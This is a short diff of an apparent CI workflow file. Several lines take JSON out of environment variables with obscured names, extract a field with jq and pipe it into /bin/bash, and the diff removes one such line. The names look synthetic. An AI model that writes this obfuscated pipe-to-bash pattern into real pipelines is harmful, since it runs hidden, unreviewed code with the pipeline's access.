@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$pakxt16208" | jq -r .oqjem173 | /bin/bash
           echo $ydn3 | jq -r .icy36 | /bin/bash
           echo $luy16907 | jq -r .ofk8140 | /bin/bash
-          echo $xg9425 | jq -r .gzhm39 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
